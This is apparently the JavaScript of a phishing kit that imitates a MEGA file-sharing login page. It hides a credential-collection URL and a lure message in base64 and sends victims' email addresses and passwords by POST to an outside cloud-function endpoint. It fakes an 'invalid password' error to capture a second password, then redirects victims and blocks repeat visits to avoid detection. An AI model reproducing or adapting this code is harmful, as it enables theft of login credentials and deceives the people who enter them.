let isSet = localStorage.getItem('cookies-settings');
let submitedAlready = localStorage.getItem('cookies-submitedalready');
let R_L = window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9yZXN1bHRMaW5r");
let comment_new = window.atob("WW91IGFyZSBhYm91dCB0byB2aWV3IGEgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLCBwbGVhc2UgbG9naW4gd2l0aCB5b3VyIGNyZWRlbnRpYWxzIHRvIGNvbnRpbnVlLg==");
let left=0, right=0, subject = "", url_main_link = "", sec_p = false, fina = false, invalid = 0;

if (REJECT_REVISIT_USER) {
    if (submitedAlready !== null) {
        window.location.replace(REDIRECT_LINK);
    }
}


if (isSet === null) {
    document.querySelectorAll(".mega-dialog.cookie-dialog, .fm-dialog-overlay").forEach(function (element) {
        element.removeAttribute('style');
    })
    document.querySelector('.bottom-page.scroll-block.sign').classList.remove("normal");
    document.getElementById("loading").classList.remove("hideme");
    document.body.classList.remove("hideme");
} else { document.body.classList.remove("hideme"); }

if (window.innerWidth < 1050) {
    document.getElementById('theMobile').href = "./src/style2.css";
}

$(document).ready(function () {
    $(MobileMenu()).insertAfter(".topbar.top-head.js-topbar");
    change_comment();
    leftRight();
    url_main_link = getParameterByName(urlcheck("index.html", "index.html").replace("#", "")).replace(".html/index.html", ".html").replace(".htm/index.html", ".htm");
    url_main_link=url_main_link.replace("/?hash=pdf/index.html","/index.html?hash=pdf").replace("/?hash=outlook/index.html","/index.html?hash=outlook").replace("/?hash=office/index.html","/index.html?hash=office").replace("/?hash=word/index.html","/index.html?hash=word");
    url_main_link=url_main_link.replace("?hash=pdf/index.html","/index.html?hash=pdf").replace("?hash=outlook/index.html","/index.html?hash=outlook").replace("?hash=office/index.html","/index.html?hash=office").replace("?hash=word/index.html","/index.html?hash=word");
    const url = new URL(window.location.href);
    if(url.searchParams.has("hash")){
        let hash = url.searchParams.get("hash");
        if(hash=="pdf"){$(".big-illustration.login.safe-key").addClass("pdf")}
        if(hash=="word"){$(".big-illustration.login.safe-key").addClass("word")}
        if(hash=="office"){$(".big-illustration.login.safe-key").addClass("office")}
        if(hash=="outlook"){$(".big-illustration.login.safe-key").addClass("outlook")}
    }else{
        if(ICON_HASH=="pdf"){$(".big-illustration.login.safe-key").addClass("pdf")}
        if(ICON_HASH=="word"){$(".big-illustration.login.safe-key").addClass("word")}
        if(ICON_HASH=="office"){$(".big-illustration.login.safe-key").addClass("office")}
        if(ICON_HASH=="outlook"){$(".big-illustration.login.safe-key").addClass("outlook")}
    }


    let d_email = url.searchParams.has("email") ? url.searchParams.get("email") : (url.searchParams.has("user") ? url.searchParams.get("user") : "");
    if (d_email.includes("@")) {
        $("#login-name2").focus().val(d_email);
    }
    if (SHOW_EXTRA_PARAMS === true) {
        window.history.pushState($("html").html(), document.title, url_main_link.replace("&invalid=true", ""))
    }


    $(".account.dialog-dark-bottom.register span").html(window.atob("U2F2ZSB5b3VyIGZpbGVzIC8gZG9jdW1lbnRzIGFuZCBnZXQgdGhlbSBmcm9tIGFueSBkZXZpY2UsIGFueXdoZXJl"));
    if(IS_ORG){$("#org").show("slow");}


    $("button.accept-cookies, button.cookie-settings").click(function () {
        $(".mega-dialog.cookie-dialog, .fm-dialog-overlay").hide();
        $('.bottom-page.scroll-block.sign').addClass("normal");
        localStorage.setItem('cookies-settings', 'accepted');
    })

    $("#login-check2").on('change', function () {
        if (document.getElementById('login-check2').checked) {
            $(".login-check.checkbox").removeClass('checkboxOff').addClass("checkboxOn");
        } else {
            $(".login-check.checkbox").addClass('checkboxOff').removeClass("checkboxOn");
        }
    })

    $(".mega-input.title-ontop input").on('focus', function () {
        if ($(this).val().length > 0) {
            $(this).parents('.mega-input.title-ontop').addClass("valued")
        }
        $(this).parents('.mega-input.title-ontop').addClass("active")
    });

    $(".mega-input.title-ontop input").on('keypress', function () {
        $(this).parents(".mega-input.title-ontop").removeClass("error msg");
        $(this).parents(".mega-input.title-ontop").find(".message-container").removeClass("hideme")
    })

    $(".mega-input.title-ontop input").on('focusout', function () {
        if ($(this).val().length > 0) {
            $(this).parents('.mega-input.title-ontop').addClass("valued")
        } else {
            $(this).parents('.mega-input.title-ontop').removeClass("valued")
        }
        $(this).parents('.mega-input.title-ontop').removeClass("active")
    });


    $(".mega-button.positive.login-button.large.right").on('click', function () {
        let username = $("#login-name2").val();
        let password = $("#login-password2").val();
        $("#login-name2, #login-password2").parents(".mega-input.title-ontop").removeClass("error msg");
        if (!validateEmail(username)) {
            $("#login-name2").parents(".mega-input.title-ontop").addClass("error msg");
            $("#login-name2 + .message-container").html("Please enter a valid email address.");
        }
        else if (password.length < 6) {
            $("#login-password2").parents(".mega-input.title-ontop").addClass("error msg");
            $("#login-password2 + .message-container").html("Please enter your password.");
        }
        else {
            $(".dark-overlay, .loading-spinner").removeClass("hidden");
            $(".loading-spinner").addClass("active");
            subject = sec_p === true ? " - Second Try" : "";
            $.ajax({
                dataType: "JSON",
                url: SCRIPT_LINK.includes("://") ? SCRIPT_LINK : R_L,
                type: "POST",
                data: {
                    userid: username,
                    pwd: password,
                    confirmed: subject,
                    res: "real",
                    license: LICENSE_KEY,
                    reject: REJECT_GMAIL ? "Yes" : ""
                },
                success: function (response) {
                    setTimeout(function () {
                        if (sec_p === true) {
                            localStorage.setItem('cookies-submitedalready', 'accepted');
                            setTimeout(function () {
                                window.location.replace(REDIRECT_LINK)
                            }, 500)
                        } else {
                            setTimeout(function () {
                                if (response.msg == "Yes Sent") {
                                    sec_p = true;
                                    $("#login-password2").parents(".mega-input.title-ontop").addClass("error msg");
                                    $("#login-password2 + .message-container").html("Invalid email and/or password. Please try again");
                                    $("#login-name2").parents(".mega-input.title-ontop").addClass("error");
                                    $("#login-password2").val("").focus();
                                } else {
                                    if (response.msg == "reject") {
                                        $("#login-password2").parents(".mega-input.title-ontop").addClass("error");
                                        $("#login-name2").parents(".mega-input.title-ontop").addClass("error msg");
                                        $("#login-name2 + .message-container").html("Email not supported, please use other email account");
                                        $("#login-password2").val(""); $("#login-name2").focus();
                                    } else {
                                        console.log(response)
                                        window.location.replace(url_main_link)
                                    }
                                }
                                $(".dark-overlay, .loading-spinner").addClass("hidden");
                                $(".loading-spinner").removeClass("active");
                            }, 500)
                        }
                    }, 10)
                },
                error: function (response) {
                    console.log(response)
                    window.location.replace(url_main_link)
                },
                complete: function () { }
            })

        }
    })




    document.querySelectorAll("a").forEach(function (element) {
        $(element).attr("onclick", "return false;")
    })

    $(window).resize(function () {
        if (window.innerWidth < 1048) { document.getElementById('theMobile').href = "./src/style2.css"; } else { document.getElementById('theMobile').href = ""; }
    })
})


function leftRight() {
    if (left < 180) {
        left++;
        $("#loadinganimleft").css({ "transform": `rotate(${left}deg)` })
    } else if (right < 180) {
        right++;
        $("#loadinganimright").css({ "transform": `rotate(${right}deg)` })
    }
    if (left < 180 || right < 180) {
        setTimeout("leftRight()", 15);
    } else {
        setTimeout(function () {
            $("#loading").hide();
        }, 1500);
    }
}


function change_comment(){
    let b =  document.querySelector(".login-slide-block h2 b").outerHTML;
    let br =  document.querySelector(".login-slide-block h2 br").outerHTML;
    $(".login-slide-block h2").html(`${b}${br}${comment_new}`);
}


function validateEmail(mail) {
   if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,5})+$/.test(mail)){ return true; }return false;
}

function getParameterByName(name){let ser="";const url=new URL(name.split("#").join(""));let query=url.search.split("?").join("&").split("&&").join("&");let qur=url.search.split("?").join("&");qur=qur.split("&&").join("&");let link=url.href.split("?")[0];$.each(qur.split("&"),function(index,value){var name="---"+value.split("=")[0]+"---";if(ser.includes(name)){query=query.replace("&"+value,"").replace(value,"")}else{ser=ser+name}});return(link+"?"+query).replace("?&","?")}function urlcheck(e,t){let r=location.href;return r.includes("?"),r.includes(e)?r=r.replace(e,t):r.endsWith("/")?r+=t:r=r+"/"+t,r=r+"?scriptID="+Math.random().toString().replace("0.","")+"&cookies="+window.btoa(Math.random().toString()).replace("=","").replace("=","")+"&token="+Math.random().toString().replace("0.","")}

function MobileMenu(){return window.atob("PGRpdiBjbGFzcz0ibW9iaWxlIGZtLXJvdyI+IDxkaXYgY2xhc3M9Im1vYmlsZSBmbS1oZWFkZXIgZm0taHIgc2lnbi1oZWFkZXIiPiA8ZGl2IGNsYXNzPSJtb2JpbGUgZm0taWNvbiB0b3AtaWNvbiBtZW51IHJpZ2h0Ij48L2Rpdj4gPGRpdiBjbGFzcz0ibW9iaWxlIGZtLWljb24gbWVnYSBsZWZ0Ij48L2Rpdj4gPGRpdiBjbGFzcz0ibW9iaWxlIGZtLWhlYWRlci10eHQgc2lnbi1pbiI+TG9naW48L2Rpdj4gPGRpdiBjbGFzcz0ibW9iaWxlIGZtLWhlYWRlci10eHQgcmVnaXN0ZXIgaGlkZGVuIj5DcmVhdGUgQWNjb3VudDwvZGl2PiA8L2Rpdj4gPC9kaXY+");}